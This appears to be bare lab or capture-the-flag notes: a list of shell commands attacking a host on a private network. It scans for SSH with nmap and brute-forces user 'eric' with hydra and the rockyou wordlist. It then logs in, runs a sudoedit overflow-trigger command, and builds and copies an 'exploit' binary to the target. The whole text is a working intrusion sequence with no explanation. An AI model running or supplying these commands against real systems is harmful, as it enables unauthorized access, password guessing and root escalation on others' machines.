
nmap -sV -p22 192.168.33.0-20
cd /usr/share/wordlists
sudo gzip -d rockyou.txt.gz
hydra -l eric -P rockyou.txt 192.168.33.10
ssh eric@192.168.33.10
password
sudoedit -s '\' `perl -e 'print "A" x 65536'`

cd /blah/blah
make
# rm ~/.ssh/known_hosts
scp exploit eric@192.168.33.10:/home/eric/

sudo apt install build-essential
sudo apt install gcc

